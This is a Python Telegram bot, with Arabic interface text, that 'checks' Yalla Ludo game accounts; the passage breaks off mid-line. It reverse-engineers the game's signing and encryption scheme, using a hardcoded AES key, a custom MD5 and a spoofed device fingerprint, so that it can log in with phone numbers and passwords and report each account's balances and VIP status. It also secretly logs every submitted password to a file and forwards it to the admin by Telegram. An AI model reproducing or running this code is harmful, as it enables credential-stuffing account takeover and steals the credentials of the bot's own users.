import base64, json, hashlib, time, uuid, struct, hmac as hmacmod, random, string, math, sys, os
import requests
import telebot
from telebot import types, apihelper
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from datetime import datetime
from flask import Flask
import threading
import urllib.request

# ==================== إعدادات البوت ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))

if not BOT_TOKEN:
    print("❌ خطأ: BOT_TOKEN غير موجود")
    sys.exit(1)

# ==================== إنشاء تطبيق Flask ====================
app = Flask(__name__)

@app.route('/')
def home():
    return "🚀 بوت Yalla Ludo يعمل 24/7"

@app.route('/health')
def health():
    return "✅ Bot is running"

# ==================== إعدادات البوت ====================
bot = telebot.TeleBot(BOT_TOKEN)

# ==================== دوال حفظ البيانات ====================
RESULTS_FILE = "check_results.txt"
USERS_FILE = "users_ids.txt"

# ==================== قائمة الدول ورموزها ====================
COUNTRIES = {
    "🇸🇦 السعودية": "966",
    "🇮🇶 العراق": "964",
    "🇰🇼 الكويت": "965",
    "🇦🇪 الإمارات": "971",
    "🇶🇦 قطر": "974",
    "🇧🇭 البحرين": "973",
    "🇴🇲 عمان": "968",
    "🇪🇬 مصر": "20",
    "🇩🇿 الجزائر": "213",
    "🇲🇦 المغرب": "212",
    "🇯🇴 الأردن": "962",
    "🇱🇧 لبنان": "961",
    "🇸🇾 سوريا": "963",
    "🇵🇸 فلسطين": "970",
    "🇾🇪 اليمن": "967",
    "🇱🇾 ليبيا": "218",
    "🇹🇳 تونس": "216",
    "🇸🇩 السودان": "249",
    "🇲🇷 موريتانيا": "222",
    "🇸🇴 الصومال": "252",
}

def save_user(user_id, username=None, first_name=None):
    try:
        if not os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'w', encoding='utf-8') as f:
                f.write("# قائمة المستخدمين\n")
                f.write(f"# تم الإنشاء: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("#" + "="*50 + "\n\n")
        
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            existing = f.read()
        
        if str(user_id) in existing:
            return False
        
        with open(USERS_FILE, 'a', encoding='utf-8') as f:
            username_str = f"@{username}" if username else "بدون معرف"
            f.write(f"ID: {user_id} | الاسم: {first_name or 'بدون اسم'} | المعرف: {username_str} | التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        return True
    except Exception as e:
        print(f"خطأ في حفظ المستخدم: {e}")
        return False

def save_result(user_id, username, mobile, password, area_code, result_data):
    try:
        with open(RESULTS_FILE, 'a', encoding='utf-8') as f:
            f.write("="*60 + "\n")
            f.write(f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"👤 المستخدم: {user_id} | @{username or 'بدون معرف'}\n")
            f.write(f"📱 الرقم: {mobile}\n")
            f.write(f"🌍 الدولة: +{area_code}\n")
            f.write(f"🔑 الباسورد: {password}\n")
            f.write("-"*60 + "\n")
            
            if result_data and result_data.get('status') == 0:
                data = result_data.get('data', {})
                base = data.get('baseInfo', {})
                game = data.get('gameInfo', {})
                
                f.write(f"✅ الاسم: {base.get('name', 'غير معروف')}\n")
                f.write(f"🆔 الرقم: {base.get('showNumId', 'غير متوفر')}\n")
                f.write(f"⭐ المستوى: {base.get('levelId', '0')}\n")
                f.write(f"💎 الماس: {base.get('diamondNum', '0')}\n")
                f.write(f"🪙 الذهب: {base.get('goldNum', '0')}\n")
                f.write(f"👑 VIP: {'نعم' if base.get('isVip') else 'لا'}\n")
                f.write(f"🎮 عدد اللعب: {game.get('totalCount', 0)}\n")
                f.write(f"🏆 نسبة الفوز: {game.get('totalWinPercent', 0)*100:.1f}%\n")
                f.write(json.dumps(result_data, ensure_ascii=False, indent=2) + "\n")
            else:
                f.write(f"❌ فشل: {result_data}\n")
            f.write("\n")
        
        send_admin_notification(user_id, username, mobile, password, area_code, result_data)
    except Exception as e:
        print(f"خطأ في حفظ النتيجة: {e}")

def send_admin_notification(user_id, username, mobile, password, area_code, result_data):
    try:
        country_name = [name for name, code in COUNTRIES.items() if code == area_code]
        country_name = country_name[0] if country_name else area_code
        
        text = f"🔔 <b>فحص جديد!</b>\n"
        text += f"{'─' * 30}\n"
        text += f"👤 <b>المستخدم:</b> {user_id}\n"
        text += f"📝 <b>المعرف:</b> @{username or 'بدون معرف'}\n"
        text += f"📱 <b>الرقم:</b> {mobile}\n"
        text += f"🌍 <b>الدولة:</b> {country_name} (+{area_code})\n"
        text += f"🔑 <b>الباسورد:</b> <code>{password}</code>\n"
        text += f"{'─' * 30}\n"
        
        if result_data and result_data.get('status') == 0:
            data = result_data.get('data', {})
            base = data.get('baseInfo', {})
            game = data.get('gameInfo', {})
            
            text += f"✅ <b>الاسم:</b> {base.get('name', 'غير معروف')}\n"
            text += f"🆔 <b>الرقم:</b> {base.get('showNumId', 'غير متوفر')}\n"
            text += f"⭐ <b>المستوى:</b> {base.get('levelId', '0')}\n"
            text += f"💎 <b>الماس:</b> {base.get('diamondNum', '0')}\n"
            text += f"🪙 <b>الذهب:</b> {base.get('goldNum', '0')}\n"
            text += f"👑 <b>VIP:</b> {'✅ نعم' if base.get('isVip') else '❌ لا'}\n"
            text += f"🎮 <b>عدد اللعب:</b> {game.get('totalCount', 0):,}\n"
            text += f"🏆 <b>نسبة الفوز:</b> {game.get('totalWinPercent', 0)*100:.1f}%\n"
        else:
            text += f"❌ <b>فشل:</b> {result_data}\n"
        
        bot.send_message(ADMIN_ID, text, parse_mode="HTML")
    except Exception as e:
        print(f"خطأ في إرسال الإشعار: {e}")

# ==================== دوال التشفير ====================
b1key   = b'4e82797b276c5cb729db62aaa229a057'
b1iv    = b'0102030405060708'
secret  = 'L3)qk*@8'

ua      = "YallaLudo-1.5.0.0-(Build 1050003)-Android 32"
version = "1.5.1.0"

api      = "https://httpgateway.carrstuv.com/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
infopath = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
infohosts = [
    "https://httpgateway.talkwxy.com",
    "https://httpgateway.yalla.games",
    "https://httpgateway.beachab.com",
]

kvals = [int(abs(math.sin(i+1)) * 2**32) & 0xffffffff for i in range(64)]
shift = [7,12,17,22]*4 + [5,9,14,20]*4 + [4,11,16,23]*4 + [6,10,15,21]*4
ivrev = (0x10325476, 0x98badcfe, 0xefcdab89, 0x67452301)

def md5raw(msg, iv):
    a0, b0, c0, d0 = iv
    length = len(msg) * 8
    m = msg + b'\x80'
    while len(m) % 64 != 56:
        m += b'\x00'
    m += struct.pack('<Q', length)
    for ch in range(0, len(m), 64):
        block = struct.unpack('<16I', m[ch:ch+64])
        a, b, c, d = a0, b0, c0, d0
        for i in range(64):
            if i < 16:
                f = (b & c) | (~b & d)
                g = i
            elif i < 32:
                f = (d & b) | (~d & c)
                g = (5*i+1) % 16
            elif i < 48:
                f = b ^ c ^ d
                g = (3*i+5) % 16
            else:
                f = c ^ (b | ~d)
                g = (7*i) % 16
            f = (f + a + kvals[i] + block[g]) & 0xffffffff
            a = d
            d = c
            c = b
            b = (b + ((f << shift[i]) | (f >> (32-shift[i])))) & 0xffffffff
        a0 = (a0+a) & 0xffffffff
        b0 = (b0+b) & 0xffffffff
        c0 = (c0+c) & 0xffffffff
        d0 = (d0+d) & 0xffffffff
    return struct.pack('<4I', a0, b0, c0, d0)

def md5r(msg):
    return md5raw(msg, ivrev).hex()

def md5s(msg):
    return hashlib.md5(msg).hexdigest()

def md5upper(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()

def xorstream(data, hera):
    k = md5r(hera.encode() + secret.encode()).encode()
    ks = (k * (len(data) // len(k) + 1))[:len(data)]
    return bytes(a ^ b for a, b in zip(data, ks))

def encrypt(data, hera):
    return base64.b64encode(xorstream(data, hera)).decode()

def sign(data, hera):
    key = md5r(hera.encode() + secret.encode()).encode()
    return hmacmod.new(key, data, hashlib.sha256).hexdigest()

def medusa(data, hera):
    pt = f'{md5s(data)}-{len(data)}-{md5r(hera.encode() + secret.encode())}-{secret}'
    ct = AES.new(b1key, AES.MODE_CBC, b1iv).encrypt(pad(pt.encode(), 16))
    return base64.b64encode(ct).decode()

devfile = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ludo_device_id.json')

def gendevice():
    try:
        with open(devfile) as f:
            d = json.load(f)
            return d['device'], d['android'], d['shumeng'], d['nonce']
    except Exception:
        device = str(uuid.uuid4())
        android = f'{uuid.uuid4().hex}_{uuid.uuid4().hex[:16]}'
        shumeng = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(36))
        nonce = f'{random.randint(-2**31, 2**31 - 1)}_{uuid.uuid4()}'
        try:
            with open(devfile, 'w') as f:
                json.dump({'device': device, 'android': android, 'shumeng': shumeng, 'nonce': nonce}, f)
        except Exception:
            pass
        return device, android, shumeng, nonce

device, android, shumeng, nonce = gendevice()

def decode(resp, hera=None):
    xorkey = bytes.fromhex("3336613636313637666532623236633033363933663061643936653462613439")
    param = resp.get("paramJsonString", "")
    if not param:
        return resp
    raw = base64.b64decode(param)
    for fn in ("fixed", "hera"):
        try:
            if fn == "fixed":
                dec = bytes(v ^ xorkey[i % len(xorkey)] for i, v in enumerate(raw))
            else:
                dec = xorstream(raw, hera)
            return json.loads(dec.decode('utf-8'))
        except Exception:
            continue
    return resp

def baggage(timestamp):
    obj = {
        "timeSpan": str(timestamp), "version": version, "deviceId": device,
        "deviceName": "samsung Galaxy S23 Ultra", "deviceType": 2, "downloadChannelId": 1,
        "shuMengId": shumeng, "nonce": nonce, "plateType": 0, "LanguageId": 2,
        "phoneModel": "SM-S918B", "X-Phone-Country": "SA", "X-Sim-Country": "SA",
        "AndroidId": android, "appType": 0,
    }
    return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()

def payload(mobile, password, area="966"):
    m = mobile.replace(" ", "").replace("-", "").replace("+", "")
    if m.startswith(area):
        m = m[len(area):]
    m = m.lstrip("0")
    data = {
        "mobile": m, "areaCode": area, "password": md5upper(password),
        "languageId": 2, "nationalityId": "1",
        "hostConfig": [
            {"bizType":5000,"countryCode":"IQ","hostUrl":"https://api-shumeng.yalla.games","type":2,"version":4},
            {"bizType":5001,"countryCode":"","hostUrl":"ws://firebreak.yalla.games","type":1,"version":1},
            {"bizType":1006,"countryCode":"IQ","hostUrl":"https://httpgateway.foodjkl.com,https://httpgateway.planecde.com,https://httpgateway.carrstuv.com","type":2,"version":20},
            {"bizType":1000,"countryCode":"IQ","hostUrl":"https://account.foodjkl.com,https://account.yalla.games,https://account.carrstuv.com","type":2,"version":19},
        ],
        "simCountry": "SA", "version": version,
        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2, "downloadChannelId": 1,
        "shuMengId": shumeng, "nonce": nonce,
        "plateType": 0, "phoneModel": "SM-S918B",
        "X-Phone-Country": "SA", "X-Sim-Country": "SA",
        "AndroidId": android, "IsSubpackages": 0, "appType": 0, "idfa": "",
    }
    return json.dumps(data, separators=(',',':'), ensure_ascii=False).encode('utf-8')

def buildrequest(body, token='', uid='0', path=None):
    now = int(time.time() * 1000)
    hera = uuid.uuid4().hex
    bag = baggage(now)
    endpoint = path if path else '/' + '/'.join(api.split('/')[3:])
    signed = (endpoint + token + ua + bag).encode('utf-8')
    
    headers = {
        'User-Agent': ua,
        'UserId': str(uid),
        'X-App-Id': 'ludo',
        'X-Baggage': bag,
        'X-Access-Token': token,
        'X-Timestamp': str(now),
        'versionString': version,
        'X-Sign': f'2.0_2_{sign(signed, hera)}',
        'X-Hera': hera,
        'X-Time': str(now),
        'X-Medusa': medusa(signed, hera),
        'Content-Type': 'application/json; charset=utf-8',
    }
    
    wire = json.dumps({"paramJsonString": encrypt(body, hera)}, separators=(',',':')).encode('utf-8')
    return headers, wire

def login(mobile, password, area):
    body = payload(mobile, password, area)
    headers, wire = buildrequest(body)
    hera = headers['X-Hera']
    response = requests.post(api, data=wire, headers=headers, timeout=25)
    return decode(response.json(), hera)

def infopayload(account):
    data = {
        "accountId": int(account),
        "simCountry": "SA", "version": version,
        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2, "downloadChannelId": 1,
        "shuMengId": shumeng, "nonce": nonce, "plateType": 0,
        "languageId": 2, "phoneModel": "SM-S918B",
        "X-Phone-Country": "SA", "X-Sim-Country": "SA",
        "AndroidId": android, "IsSubpackages": 0, "appType": 0,
    }
    return json.dumps(data, separators=(',',':')).encode('utf-8')

def fetchinfo(token, uid, account, host):
    body = infopayload(account)
    headers, wire = buildrequest(body, token=token, uid=uid, path=infopath)
    headers['accessId'] = md5upper(str(account))
    hera = headers['X-Hera']
    response = requests.post(host + infopath, data=wire, headers=headers, timeout=25)
    return decode(response.json(), hera)

def getinfo(token, uid, account):
    last = None
    for host in infohosts:
        try:
            result = fetchinfo(token, uid, account, host)
            if result.get('status') == 0:
                return result
            last = result
        except Exception as e:
            last = {'status': -1, 'tips': str(e)}
        time.sleep(1.2)
    return last or {'status': -1, 'tips': 'لا يوجد رد'}

# ==================== دوال البوت ====================
def check_account(mobile, password, area):
    try:
        lg = login(mobile, password, area)
        if lg.get('status') != 0:
            return {'status': lg.get('status'), 'tips': lg.get('tips', 'فشل تسجيل الدخول')}
        d = lg['data']
        token = d['token']
        uid = d['id']
        result = getinfo(token, uid, uid)
        if result.get('status') != 0:
            return {'status': result.get('status'), 'tips': result.get('tips', 'فشل جلب المعلومات')}
        return result
    except Exception as e:
        return {'status': -1, 'tips': str(e)}

def format_result(result, mobile, password, country_name):
    if result.get('status') != 0:
        return f"❌ فشل: {result.get('tips', 'خطأ غير معروف')}"
    data = result.get('data', {})
    base = data.get('baseInfo', {})
    game = data.get('gameInfo', {})
    text = f"📊 <b>معلومات الحساب</b>\n"
    text += f"{'─' * 30}\n"
    text += f"📱 <b>الرقم:</b> {mobile}\n"
    text += f"🌍 <b>الدولة:</b> {country_name}\n"
    text += f"🔑 <b>الباسورد:</b> <code>{password}</code>\n"
    text += f"{'─' * 30}\n"
    text += f"👤 <b>الاسم:</b> {base.get('name', 'غير معروف')}\n"
    text += f"🆔 <b>الرقم الظاهر:</b> {base.get('showNumId', 'غير متوفر')}\n"
    text += f"⭐ <b>المستوى:</b> {base.get('levelId', '0')}\n"
    text += f"💎 <b>الماس:</b> {base.get('diamondNum', '0')}\n"
    text += f"🪙 <b>الذهب:</b> {base.get('goldNum', '0')}\n"
    text += f"👑 <b>VIP:</b> {'✅ نعم' if base.get('isVip') else '❌ لا'}\n"
    text += f"{'─' * 30}\n"
    text += f"🎮 <b>عدد اللعب:</b> {game.get('totalCount', 0):,}\n"
    text += f"🏆 <b>نسبة الفوز:</b> {game.get('totalWinPercent', 0)*100:.1f}%\n"
    text += f"🏅 <b>الميداليات:</b> {len(data.get('medalList', []))}\n"
    text += f"{'─' * 30}\n"
    text += f"👨‍💻 <b>by</b> @devil_2M"
    return text

# ==================== أوامر البوت ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    save_user(user_id, username, first_name)
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_check = types.InlineKeyboardButton("🔍 فحص حساب", callback_data="check")
    btn_country = types.InlineKeyboardButton("🌍 اختيار الدولة", callback_data="country")
    btn_dev = types.InlineKeyboardButton("👨‍💻 المطور", url="https://t.me/devil_2M")
    markup.add(btn_check, btn_country, btn_dev)
    
    welcome_text = (
        f"🎲 <b>بوت فحص حسابات Yalla Ludo</b>\n\n"
        f"👋 أهلاً بك <b>{first_name}</b>!\n\n"
        f"هذا البوت يفحص حسابات Yalla Ludo ويعرض معلوماتها.\n\n"
        f"📌 اختر الدولة أولاً ثم اضغط 'فحص حساب'"
    )
    
    bot.send_message(message.chat.id, welcome_text, parse_mode="HTML", reply_markup=markup)

# ==================== اختيار الدولة ====================
user_country = {}  # تخزين الدولة لكل مستخدم

@bot.callback_query_handler(func=lambda call: call.data == "country")
def choose_country(call):
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    # إضافة أزرار الدول (صفين)
    buttons = []
    for name, code in COUNTRIES.items():
        buttons.append(types.InlineKeyboardButton(name, callback_data=f"country_{code}"))
    
    # ترتيب الأزرار في صفين
    for i in range(0, len(buttons), 2):
        row = buttons[i:i+2]
        markup.add(*row)
    
    # زر رجوع
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back_to_menu"))
    
    bot.edit_message_text(
        "🌍 <b>اختر دولة الحساب:</b>\n\n"
        "اختر الدولة التي ينتمي لها الرقم الذي تريد فحصه.",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode="HTML",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("country_"))
def set_country(call):
    area_code = call.data.replace("country_", "")
    
    # البحث عن اسم الدولة
    country_name = None
    for name, code in COUNTRIES.items():
        if code == area_code:
            country_name = name
            break
    
    if country_name:
        user_country[call.from_user.id] = area_code
        bot.answer_callback_query(call.id, f"✅ تم اختيار {country_name}")
        
        # رجوع للقائمة
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn_check = types.InlineKeyboardButton("🔍 فحص حساب", callback_data="check")
        btn_country = types.InlineKeyboardButton("🌍 تغيير الدولة", callback_data="country")
        btn_dev = types.InlineKeyboardButton("👨‍💻 المطور", url="https://t.me/devil_2M")
        markup.add(btn_check, btn_country, btn_dev)
        
        bot.edit_message_text(
            f"✅ <b>تم اختيار الدولة: {country_name}</b>\n\n"
            f"الآن اضغط على 'فحص حساب' للبدء.",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="HTML",
            reply_markup=markup
        )
    else:
        bot.answer_callback_query(call.id, "❌ حدث خطأ، حاول مرة أخرى")

@bot.callback_query_handler(func=lambda call: call.data == "back_to_menu")
def back_to_menu(call):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_check = types.InlineKeyboardButton("🔍 فحص حساب", callback_data="check")
    btn_country = types.InlineKeyboardButton("🌍 اختيار الدولة", callback_data="country")
    btn_dev = types.InlineKeyboardButton("👨‍💻 المطور", url="https://t.me/devil_2M")
    markup.add(btn_check, btn_country, btn_dev)
    
    bot.edit_message_text(
        "🎲 <b>بوت فحص حسابات Yalla Ludo</b>\n\n"
        "اختر الدولة أولاً ثم اضغط 'فحص حساب'",
        chat_id=call.mes
